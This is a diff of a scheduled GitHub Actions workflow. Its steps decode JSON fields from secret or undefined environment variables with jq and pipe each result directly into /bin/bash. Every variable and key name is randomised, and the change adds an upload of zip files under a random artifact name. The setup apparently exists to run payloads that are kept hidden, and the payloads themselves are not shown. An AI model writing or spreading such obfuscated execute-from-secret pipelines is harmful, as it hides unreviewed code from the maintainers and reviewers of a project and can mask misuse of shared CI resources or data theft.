@@ -1,29 +1,27 @@
 name: baoxinhecao
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '42 3/6 * * *'
-jobs:  # 6490
+    - cron: '11 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: baoxinhecao
         env:
-          nfx1912: ${{ secrets.nfx1912 }}
+          rq61: ${{ secrets.rq61 }}
         run: |
-          echo $nfx1912 | jq -r .v21169 | /bin/bash
-          echo $l01743 | jq -r .r8194 | /bin/bash
-          echo $fjz073 | jq -r .lh85 | /bin/bash
-          echo $otjis40524 | jq -r .iwjvw73735 | /bin/bash
-          echo $gubpc55582 | jq -r .n733 | /bin/bash
-          echo $hutz6 | jq -r .yks98927 | /bin/bash
-          echo $h5758 | jq -r .c31 | /bin/bash
-          echo $oqukm23 | jq -r .p52873 | /bin/bash
-          echo $chbiq5254 | jq -r .ocj19 | /bin/bash
-          echo $o7818 | jq -r .nd2 | /bin/bash
-          echo $r330 | jq -r .ftljg7280 | /bin/bash
-          echo $peijh549 | jq -r .afe8 | /bin/bash
+          printf '%s' "$rq61" | jq -r .kqv204 | /bin/bash
+          echo $r344 | jq -r .jb406 | /bin/bash
+          printf '%s' "$huxib83" | jq -r .wmsmb3460 | /bin/bash
+          printf '%s' "$p519" | jq -r .bwku7402 | /bin/bash
+          printf '%s' "$qb80" | jq -r .uyjtp0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0YVZXRTa
+          path: "*.zip"
+          retention-days: 1
